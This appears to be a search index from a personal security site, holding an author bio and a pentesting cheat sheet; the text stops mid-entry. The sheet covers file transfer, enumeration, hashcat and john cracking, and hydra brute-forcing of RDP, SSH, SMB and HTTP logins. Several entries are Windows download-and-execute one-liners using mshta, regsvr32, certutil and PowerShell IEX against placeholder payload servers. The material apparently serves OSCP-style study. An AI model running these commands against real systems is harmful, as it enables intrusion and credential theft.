{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"About/","title":"About","text":"<p>BitwiseOperator XOR_ [_ as in blinking terminal cursor]</p> <p>Graduated with a bachelor's degree in Software Engineer, worked as a Support Engineer for 5 years Installing Call Center solutions, configuring Windows Servers, Installing, configuring, and Administering SQL Server Databases, QA [White &amp; Black box testing], FTP Servers, VDIs, VMs, wrote Windows Applications and Services to increase my efficiency. I also worked closely with the Dev team and assisted in countless debug sessions, digging through logs and Wireshark captures year after year to locate bugs and resolve them, some the protocols I worked with UDP, RTP, SIP, Skinny, H323.</p> <p>Currently, I'm a Network Engineer and have been in that role for over 4 years now. I manage mid-market WiFi support for a Fortune 500 company, you can imagine the never-ending workload and underpay.</p> <p>I manage the following:</p> <ul> <li>Firewalls [Meraki MX, Juniper SRX, Zyxel USG].</li> <li>[WLC] Wireless LAN Controllers [Ruckus SmartZone, Ruckus ZoneDirector, Ruckus Unleashed, Aruba Central, Aruba Mobility, Aruba and Ruckus local Clusters]. </li> <li>[APs] Access Points [Aruba, Meraki, Ruckus]. </li> <li>Client Gateways [Nomadix].</li> </ul> <p>I also worked on the following:</p> <ul> <li>Radius Authentication issue. </li> <li>[RF] Radio Frequency issues with WiFi 2.4GHz and 5GHz bands, resolved very complex issues with relation to interference, signal coverage, and other client issues. </li> <li>VPN [Virtual Private Network] tunnels to our managed equipment. </li> <li>[Landing Pages | Captive Portals] &gt; Basically the page that pops up when you connect to WiFi at a hotel, airport, caf\u00e9, resort, etc. </li> <li>Python scripting, automating tasks. Not in the job description but when you have to work with an insane number of devices, it just makes more sense. </li> <li>Troubleshooting OSI [L1, L2, L3] with on-site staff or dispatched Techs. </li> <li>Process RMA, place Inventory Requests, write SOW for Tech dispatches, and work with OEMs.</li> <li>Firmware upgrades and patching.</li> <li>Setting up VLANs, DHCP Servers, DNS, DDNS.</li> </ul> <p>I have a major interest in Cyber Security and Security research, this is a decade-long interest, I have been trying to make the time to gain more skills and knowledge in this space and have been doing that for the past couple of years.</p> <p>I created Internal documentation and articles to help others better understand processes and fix complex issues, I was never tasked or asked to do any of that but I always felt like I could help others so they don't have to go through the same struggles I had to when I started.</p> <p>I have too many interests, some of which are in Technology, Security, Networking, Research, and Engineering, I have a nonstop desire to know all of those things so I can have a better understanding of how all those points interact with each other, a part of what I call [building the logic, my logic], this is exactly what I use in solving any problem regardless of how much I know or don't know about it, that's why research is a very important skill to have. I try to stay as humble as I can with my knowledge simply because I am aware that no matter how much I learn, I will never know it all. Plus, there will always be someone that possesses a skill that I don't have and can learn from, it keeps me motivated to keep going.</p> <p>Credit where credit is due, This website was created using Material for MkDocs. I spent a lot of time in customizing the interface, functions and features to end up looking and functioning the way it does now.</p>"},{"location":"Cyber_Intelligence/","title":"Cyber Intelligence","text":"<p>https://s0cm0nkey.gitbook.io/s0cm0nkeys-security-reference-guide/cyber-intelligence/osint</p>"},{"location":"Cyber_Offensive/","title":"BitwiseOperator XOR_ [Cyber Offensive - Pentesting Tools]","text":"<p>This is a list of tools that I accumulated over time while diving into Cyber Security &amp; Pentesting. While I found some very useful repos and resources that have tools listed, I like to set things up in my own way.</p> <p>If you find any mistakes, issues or even possible enhancements or requests for other topics, you can reach me out at contact@bitwiseoperator.net</p>"},{"location":"knowledge_base/","title":"BitwiseOperator XOR_ [Knowledge Base]","text":"<p>This Knowledge Base contains notes for the many things I learned and worked on, this contains subjects related to Networking, OS, Home Labs, Programming, etc..</p> <p>If you find any mistakes, issues or even possible enhancements or requests for other topics, you can reach me out at **contact@bitwiseoperator.net **</p>"},{"location":"Cyber_Offensive/Note_Taking/","title":"Note Taking","text":""},{"location":"Cyber_Offensive/Note_Taking/#cherrytree","title":"CherryTree","text":"<p>CherryTree</p>"},{"location":"Cyber_Offensive/Note_Taking/#installing-cherrytree-on-debian-linux","title":"Installing CherryTree on Debian Linux","text":"<pre><code>sudo add-apt-repository ppa:giuspen/ppa\nsudo apt update\nsudo apt install cherrytree\n</code></pre>"},{"location":"Cyber_Offensive/Note_Taking/#cherrytree-templates","title":"CherryTree Templates","text":"<ul> <li>CTF_template</li> <li>BOX-SKELETON</li> </ul>"},{"location":"Cyber_Offensive/Note_Taking/#obsidian","title":"Obsidian","text":"<p>Obsidian Download</p>"},{"location":"Cyber_Offensive/Note_Taking/#report-templates","title":"Report Templates","text":"<ul> <li>OSCP Exam Report Template Markdown</li> <li>Public Pentesting Reports</li> </ul>"},{"location":"Cyber_Offensive/Pentesting_Guide/","title":"Pentesting Guide","text":"<ul> <li>Vulnerabilityassessment.co.uk Penetration Testing Framework 0.59</li> <li>OWASP Web Security Testing Guide</li> <li>OWASP Mobile Application Security</li> <li>OWASP Mobile Application Security Verification Standard (MASVS)</li> <li>OWASP MASTG</li> <li>Mobile Application Security Checklist</li> <li>OWASP Firmware Security Testing Methodology</li> <li>OWASP IoT Security Testing Guide ISTG</li> <li>OWASP Penetration Testing Methodologies</li> <li>OWASP Cheat Sheets</li> <li>cheatsheetseries.owasp.org</li> <li>Penetration Testing Execution Standard</li> </ul>"},{"location":"Cyber_Offensive/File_Transfers/FTP/","title":"FTP","text":"<p>FTP - File Transfer Protocol</p> <p>FTP options</p>"},{"location":"Cyber_Offensive/File_Transfers/FTP/#commands","title":"commands","text":"<pre><code>ftp ip_address\n#enter username\n#enter password\n\n#print working directory\npwd\n\n#list file in directory\nls\n\n#change working directory\ncd /dir/dir\ncd ../dir\ncd ..\ncdup\n\n#creating directory\nmkdir new_dir\n\n#removing directory\nrmdir new_dir\n\n#change transfer mode\nascii #suitable for transferring text data such as HTML files.\nbinary #\n\n#download and upload a file\nget Download.txt\nput Upload.txt\n\n#download upload multiple files\nmget *.txt\nmget file?.txt file?.zip\nmput file.jpg file.jpg\nmput *.zip\n\n#delete file | multiple files\ndelete file.zip\nmdelete *.zip\n\n#rename a file\nrename name.txt new_name.txt\n\n# append remote file data\nappend new_data.sh old_data.sh\n\n#change file permissions\nchmod 777 file.sh\nchmod +x file.sh\n\n#to exit\nbye\nexit\nquit\n</code></pre>"},{"location":"Cyber_Offensive/File_Transfers/FTP/#switches","title":"switches","text":"<pre><code>-4  Use only IPv4 to contact any host.\n-6  Use IPv6 only.\n-e  Disables command editing and history support, if it was compiled into the ftp executable. Otherwise, it does nothing.\n-p  Use passive mode for data transfers. Allows the use of ftp in environments where a firewall prevents connections from the outside world back to the client machine. Requires the ftp server to support the PASV command .\n-i  Turns off interactive prompting during multiple file transfers.\n-n  Restrains ftp from attempting auto-login upon initial connection. If auto-login is enabled, ftp checks the .netrc (see netrc ) file in the user\u2019s home directory for an entry describing an account on the remote machine. If no entry exists, ftp prompts for the remote machine login name (the default is the user identity on the local machine), and, if necessary, prompt for a password and an account with which to login.\n-g  Disables file name globbing.\n-v  The verbose option forces ftp to show all responses from the remote server, as well as report on data transfer statistics.\n-d  Enables debugging.\n</code></pre>"},{"location":"Cyber_Offensive/File_Transfers/SMB/","title":"SMB","text":"<pre><code># Set up a SMB server using smbserver.py from impacket\nsmbserver.py SHARE_NAME path/to/share\n\n# From target Windows:\nnet view \\\\KALI_IP\n(Should display the SHARE_NAME)\n\ndir \\\\KALI_IP\\SHARE_NAME\ncopy \\\\KALI_IP\\SHARE_NAME\\file.exe .\n\n# Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user\n# can be usefull to PTH, or crack passwords\n\n# Since Windows 10, you can't do anonymous smb server anymore\nsudo python smbserver.py SDFR /BloodHound/Ingestors -smb2support -username \"peon\" -password \"peon\"\nnet use Z: \\\\192.168.30.130\\SDFR /user:peon peon\nnet use Z: /delete /y\n</code></pre> <pre><code>impacket smbserver\nnet use z: \\\\attackerip\\sharename\n</code></pre>"},{"location":"Cyber_Offensive/File_Transfers/Telnet/","title":"Telnet","text":"<pre><code>telnet ip_address\nls\nPASV\nTYPE A\nSTAT\nget Download.txt\nput Upload.txt\nExit\n</code></pre>"},{"location":"Cyber_Offensive/File_Transfers/Windows_mshta_wmic_regsvr32/","title":"Windows mshta wmic regsvr32","text":"<pre><code># Method 1\nmshta vbscript:Close(Execute(\"GetObject(\"\"script:http://IP/payload.sct\"\")\"))\n\n# Method 2\nmshta http://IP/payload.hta\n\n# Method 3 (Using WebDav)\nmshta \\\\IP\\payload.hta\n\n#Download and execute XSL using wmic\nwmic os get /format:\"https://webserver/payload.xsl\"\n\n\n# Download and execute over a WebServer:\nregsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll\n\n# Using WebDAV\nregsvr32 /u /n /s /i:\\\\webdavserver\\folder\\payload.sct scrobj.dll\n\n# Powershell Cmdlet\nInvoke-WebRequest \"https://server/filename\" -OutFile \"C:\\Windows\\Temp\\filename\"\n\n# Powershell One-Line\n(New-Object System.Net.WebClient).DownloadFile(\"https://server/filename\", \"C:\\Windows\\Temp\\filename\") \n\n# In Memory Execution\nIEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')\n</code></pre>"},{"location":"Cyber_Offensive/File_Transfers/ftpd/","title":"ftpd","text":"<pre><code>/etc/init.d/pure-ftpd\n</code></pre>"},{"location":"Cyber_Offensive/File_Transfers/scp/","title":"scp","text":"<p>SCP - Secure Copy Protocol</p>"},{"location":"Cyber_Offensive/File_Transfers/scp/#commands","title":"commands","text":"<pre><code>scp &lt;options&gt; &lt;source_path&gt; &lt;destination_path&gt;\nscp o s_path d_path\n\n#specifying port with -P\nscp -P 5562 file &lt;username&gt;@&lt;remotehost_ip&gt;:&lt;/path/to/file&gt;\nscp -P 5562 f? u@ip:r_file_path\n\n# uploading a file\nscp file &lt;username&gt;@&lt;remotehost_ip&gt;:&lt;/path/to/file&gt;\nscp file u@ip:r_file_path\n\n# uploading multiple files\nscp file1 file2 &lt;username&gt;@&lt;remotehost_ip&gt;:&lt;/path/to/directory&gt;\nscp f? f? u@ip:r_dir_path\n\n# downloading a file\nscp &lt;username&gt;@&lt;remotehost_ip&gt;:&lt;/path/to/file&gt; &lt;/local/path/to/file&gt;\nscp u@ip:r_file_path l_file_path\n\n# downloading multiple files\nscp &lt;username&gt;@&lt;remotehost_ip&gt;:&lt;/path/directory/\\{file.txt,file2.txt\\}&gt; .\nscp u@ip:dir_path/\\f?,f? .\n\n# downloading a directory \nscp -r &lt;/path/to/directory&gt; &lt;username&gt;@&lt;ip_address&gt;:&lt;/path/to/directory&gt;\nscp -r l_dir_path u@ip:r_dir_path\n</code></pre>"},{"location":"Cyber_Offensive/File_Transfers/scp/#switches","title":"switches","text":"<pre><code>-r      # transfer directory \n-v      # see the transfer details\n-C      # copy files with compression\n-l 800  # limit bandwidth with 800\n-p      # preserving the original attributes of the copied files\n-P      # connection port\n-q      # hidden the output\n</code></pre>"},{"location":"Cyber_Offensive/File_Transfers/windows_certutil/","title":"windows certutil","text":"<pre><code># Multiple ways to download and execute files:\ncertutil -urlcache -split -f http://webserver/payload payload\n\n# Execute a specific .dll:\ncertutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil /logfile= /LogToConsole=false /u payload.dll\n\n# Execute an .exe:\ncertutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe\n</code></pre>"},{"location":"Cyber_Offensive/File_Transfers/windows_cscript/","title":"windows cscript","text":"<pre><code># Execute file from a WebDav server:\ncscript //E:jscript \\\\IP\\folder\\payload.txt\n\n# Download using wget.vbs\ncscript wget.vbs http://IP/file.exe file.exe\n\n# One liner download file from WebServer:\npowershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex\"\npowershell -exec bypass -c \"(new-object System.Net.WebClient).DownloadFile('http://IP/file.exe','C:\\Users\\user\\Desktop\\file.exe')\"\n\n# Download from WebDAV Server:\npowershell -exec bypass -f \\\\IP\\folder\\payload.ps1\n</code></pre>"},{"location":"Cyber_Offensive/Initial_Enumeration/Initial_Enumeration/","title":"Initial Enumeration","text":""},{"location":"Cyber_Offensive/Initial_Enumeration/Initial_Enumeration/#nmap","title":"nmap","text":"<pre><code>sudo nmap -sV -A --min-rate 1500 x.x.x.x\nsudo nmap -p x,x,x --script vuln x.x.x.x\n</code></pre>"},{"location":"Cyber_Offensive/Initial_Enumeration/Initial_Enumeration/#metasploit","title":"metasploit","text":"<pre><code>systemctl start postgresql\nmsfdb init\nmsfconsole\ndb_status\nworkspace -a &lt;project_name&gt;\nworkspace\n\ndb_nmap -sV -A -p- x.x.x.x\nhosts\nservices\nvulns\n</code></pre>"},{"location":"Cyber_Offensive/Initial_Enumeration/Initial_Enumeration/#nikto","title":"Nikto","text":"<p>Nikto web server scanner</p>"},{"location":"Cyber_Offensive/Lock_Picking/Lock_Picking/","title":"Lock Picking","text":""},{"location":"Cyber_Offensive/Lock_Picking/Lock_Picking/#sources","title":"sources","text":"<ul> <li>practicalselfreliance - beginners guide to lock picking</li> <li>LockPickingLawyer</li> <li>covert instruments</li> <li>Youtube - Covert Instruments</li> </ul>"},{"location":"Cyber_Offensive/Misc/Car_Hacking/","title":"Car Hacking","text":"<p>CAN Injection you can check kentindell CAN Injection</p>"},{"location":"Cyber_Offensive/Misc/Interesting_Protocols/","title":"Interesting Protocols","text":"<p>TR-069 Port 7547</p>"},{"location":"Cyber_Offensive/Misc/Resources/","title":"Resources","text":"<ul> <li>Zero Day Initiative</li> <li>Sam Curry</li> </ul>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Argon2_cracker/","title":"Argon2 cracker","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Argon2_cracker/#sources","title":"sources","text":"<ul> <li>Argon2 Cracker Github</li> </ul>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Argon2_cracker/#install","title":"install","text":"<pre><code>git clone https://github.com/CyberKnight00/Argon2_Cracker.git\npip3 install -r requirement.txt\nchmod +x crack_argon2.py\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Argon2_cracker/#-w-specify-custom-wordlist","title":"-w specify custom wordlist","text":"<pre><code>./crack_argon2.py -c '&lt; Argon2 Hash &gt;' -w '&lt; Path/To/Wordlist &gt;'\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Argon2_cracker/#-v-for-verbose-output","title":"-v for Verbose output","text":"<pre><code># Default wordlist is used\n./crack_argon2.py -c '&lt; Argon2 Hash &gt;' -v\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Argon2_cracker/#-c-option-is-used-to-specify-argon2id-type-hash","title":"-c option is used to specify Argon2id type hash","text":"<pre><code># Default word-list (/usr/share/wordlists/fasttrack.txt) is used if no wordlist is specified.\n./crack_argon2.py -c '&lt; Argon2 hash &gt;'\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/","title":"Cracking Files","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#sources","title":"sources","text":"<p>Offensive Security Cheatsheet</p>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#cracking-archives","title":"Cracking archives","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#rar","title":"RAR","text":"<pre><code>rar2john file.rar &gt; rar_hashes.txt\njohn --wordlist=passwords.txt rar_hashes.txt\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#zip","title":"ZIP","text":"<pre><code>zip2john file.rar &gt; zip_hashes.txt\njohn --wordlist=passwords.txt zip_hashes.txt\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#zip-using-fcrackzip","title":"ZIP Using fcrackzip","text":"<pre><code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt some_zip_file.zip\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#cracking-shadow-files","title":"Cracking shadow files","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#unshadow","title":"unshadow","text":"<pre><code>unshadow passwd shadow &gt; shadowjohn.txt\njohn --wordlist=/home/user/Desktop/Certifs/OSCP/Tools/Wordlist/Bruteforce/rockyou.txt --rules shadowjohn.txt\njohn --show shadowjohn.txt\n</code></pre> <pre><code>#If you have found the passwd and shadow files under linux you can combine them on a file using **unshadow** command and then crack them using **John**\nunshadow passwd.txt shadow.txt\nunshadow passwd.txt shadow.txt &gt; unshadow.txt\njohn --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#hashcat-sha512-6-shadow-file","title":"Hashcat SHA512 $6$ shadow file","text":"<pre><code>hashcat -m 1800 -a 0 hash.txt rockyou.txt --username\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#hashcat-md5-1-shadow-file","title":"Hashcat MD5 $1$ shadow file","text":"<pre><code>hashcat -m 500 -a 0 hash.txt rockyou.txt --username\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#various-cracking-techniques","title":"Various cracking techniques","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#hashcat-md5-apache-webdav-file","title":"Hashcat MD5 Apache webdav file","text":"<pre><code>hashcat -m 1600 -a 0 hash.txt rockyou.txt\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#hashcat-sha1","title":"Hashcat SHA1","text":"<pre><code>hashcat -m 100 -a 0 hash.txt rockyou.txt --force\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#hashcat-wordpress","title":"Hashcat Wordpress","text":"<pre><code>hashcat -m 400 -a 0 --remove hash.txt rockyou.txt\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#ssh-key","title":"SSH Key","text":"<pre><code>ssh2john id_rsa  &gt; sshtocrack\njohn --wordlist=/usr/share/wordlists/rockyou.txt sshtocrack\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#cracking-cisco-passwords","title":"Cracking Cisco passwords","text":"<p>Type 5 \u2192 MD5 Type 7 \u2192 Easy reversible <pre><code>hashcat -m 500 c:\\temp\\ciscohash.txt C:\\DICS\\english-dic.txt\n</code></pre></p>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#cracking-ntlvmv2-hashes","title":"Cracking NTLVMv2 hashes","text":"<pre><code>john --format=netntlmv2 --wordlist=\"/usr/share/wordlists/rockyou.txt\" hash.txt \n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#cracking-tgs","title":"Cracking TGS","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Cracking_Files/#using-john-from-bleeding-repo","title":"Using John from bleeding repo","text":"<pre><code>Go here /home/user/Desktop/Certifs/OSCP/Tools/PasswordCracking/JohnTheRipper/run\n\n./john --wordlist=/home/user/Desktop/Certifs/OSCP/Tools/Wordlist/Bruteforce/rockyou.txt --fork=4 --format=krb5tgs /home/user/Desktop/HackTheBox/VM/Active/kerberos_hashes.txt\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Decoding/","title":"Decoding","text":"<p>Via command line</p> <pre><code>echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d\n</code></pre> <p>Or you can use something like base64decode.org</p>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/","title":"Hashcat","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#sources","title":"Sources","text":"<ul> <li>hashcat_user_manual</li> <li>hashcat hash list</li> <li>Offensive Security Cheatsheet</li> </ul>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#switches","title":"switches","text":"<pre><code>#attack modes\n-a 0 # Straight : hash dict\n-a 1 # Combination : hash dict dict\n-a 3 # Bruteforce : hash mask\n-a 6 # Hybrid wordlist + mask : hash dict mask\n-a 7 # Hybrid mask + wordlist : hash mask dict\n------------------------------------------------------------------------\n#Charsets \n?l # Lowercase a-z\n?u # Uppercase A-Z\n?d # Decimals\n?h # Hex using lowercase chars\n?H # Hex using uppercase chars\n?s # Special chars\n?a # All (l,u,d,s)\n?b # Binary\n------------------------------------------------------------------------\n#options\n-m # Hash type\n-a # Attack mode\n-r # Rules file\n-V # Version\n--status # Keep screen updated\n-b # Benchmark\n--runtime # Abort after X seconds\n--session [text] # Set session name\n--restore # Restore/Resume session\n-o filename # Output to filename\n--username # Ignore username field in a hash\n--potfile-disable # Ignore potfile and do not write\n--potfile-path # Set a potfile path\n-d # Specify an OpenCL Device\n-D # Specify an OpenCL Device Type\n-l # List OpenCL Devices &amp; Types\n-O # Optimized Kernel, Passwords &lt;32 chars\n-i # Increment (bruteforce)\n--increment-min # Start increment at X chars\n--increment-max # Stop increment at X charset \n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#commands","title":"commands","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#hashcat-sha512-6-shadow-file","title":"Hashcat SHA512 $6$ shadow file","text":"<pre><code>hashcat -m 1800 -a 0 hash.txt rockyou.txt --username\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#hashcat-md5-1-shadow-file","title":"Hashcat MD5 $1$ shadow file","text":"<pre><code>hashcat -m 500 -a 0 hash.txt rockyou.txt --username\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#hashcat-md5-apache-webdav-file","title":"Hashcat MD5 Apache webdav file","text":"<pre><code>hashcat -m 1600 -a 0 hash.txt rockyou.txt\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#hashcat-sha1","title":"Hashcat SHA1","text":"<pre><code>hashcat -m 100 -a 0 hash.txt rockyou.txt --force\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#hashcat-wordpress","title":"Hashcat Wordpress","text":"<pre><code>hashcat -m 400 -a 0 --remove hash.txt rockyou.txt\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#benchmark-md4-hashes","title":"Benchmark MD4 hashes","text":"<pre><code>hashcat -b -m 900\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#create-a-hashcat-session-to-hash-kerberos-5-tickets-using-wordlist","title":"Create a hashcat session to hash Kerberos 5 tickets using wordlist","text":"<pre><code>hashcat -m 13100 -a 0 --session crackin1 hashes.txt wordlist.txt -o output.pot\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#crack-md5-hashes-using-all-char-in-7-char-passwords","title":"Crack MD5 hashes using all char in 7 char passwords","text":"<pre><code>hashcat -m 0 -a 3 -i hashes.txt ?a?a?a?a?a?a?a -o output.pot\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#crack-sha1-by-using-wordlist-with-2-char-at-the-end","title":"Crack SHA1 by using wordlist with 2 char at the end","text":"<pre><code>hashcat -m 100 -a 6 hashes.txt wordlist.txt ?a?a -o output.pot\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#crack-winzip-hash-using-mask-summer2018","title":"Crack WinZip hash using mask (Summer2018!)","text":"<pre><code>hashcat -m 13600 -a 3 hashes.txt ?u?l?l?l?l?l?l?d?d?d?d! -o output.pot\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#crack-md5-hashes-using-dictionnary-and-rules","title":"Crack MD5 hashes using dictionnary and rules","text":"<pre><code>hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rules\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#crack-md5-using-combinator-function-with-2-dictionnaries","title":"Crack MD5 using combinator function with 2 dictionnaries","text":"<pre><code>hashcat -a 1 -m 0 example0.hash example.dict example.dict\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#cracking-ntlm-hashes","title":"Cracking NTLM hashes","text":"<pre><code>hashcat64 -m 1000 -a 0 -w 4 --force --opencl-device-types 1,2 -O d:\\hashsample.hash \"d:\\WORDLISTS\\realuniq.lst\" -r OneRuleToRuleThemAll.rule\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#cracking-hashes-from-kerberoasting","title":"Cracking hashes from kerberoasting","text":"<pre><code>hashcat64 -m 13100 -a 0 -w 4 --force --opencl-device-types 1,2 -O d:\\krb5tgs.hash d:\\WORDLISTS\\realhuman_phill.txt -r OneRuleToRuleThemAll.rule\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#you-can-use-hashcat-to-perform-combined-attacks","title":"You can use hashcat to perform combined attacks","text":"<pre><code># For example by using wordlist + mask + rules\nhashcat -a 6 -m 0 prenoms.txt ?d?d?d?d -r rules/yourule.rule\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hashcat/#single-rule-used-to-uppercase-first-letter-marie2018","title":"Single rule used to uppercase first letter --&gt; Marie2018","text":"<pre><code>hashcat -a 6 -m 0 prenoms.txt ?d?d?d?d -j 'c'\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/","title":"Hydra","text":""},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#hydra-gui","title":"Hydra GUI","text":"<p>xhydra</p> <pre><code>sudo apt install hydra-gtk\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#rdp","title":"RDP","text":"<pre><code>hydra -V -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 -V\nhydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip \n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#ssh","title":"SSH","text":"<pre><code>hydra -l root -P passwords.txt -f ssh://10.0.2.5 -V\nhydra $ip -s 22 ssh -l -P big_wordlist.txt\nhydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh\nhydra -v -V -u -L users.txt -p \"\" -t 1 -u $ip ssh\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#smb","title":"SMB","text":"<pre><code>hydra -l Administrator -P passwords.txt -f smb://10.0.2.5 -V\nhydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb   \nhydra -L usernames.txt -P passwords.txt $ip smb -V -f   \n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#ftp","title":"FTP","text":"<pre><code>hydra -l root -P passwords.txt -f smb://10.0.2.5 -V\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#http-basic-auth","title":"HTTP Basic Auth","text":"<pre><code>hydra -L users.txt -P password.txt 10.0.2.5 http-get /login/ -V\nHttp get 401 login with a dictionary\nhydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin\n</code></pre>"},{"location":"Cyber_Offensive/Password_Attacks%2C_Cracking_%26_Decoding/Hydra/#http-post","title":"HTTP Post","text":"<pre><code>hydra -L users.txt -P password.txt 10.0.2.5 http-post-form\n\"/path/index.php:name=^USER^&amp;password=^PASS^&amp;enter=Sign+in:Login\nname or password is incorrect\" -V\n\nhydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.216.57 http-post-form 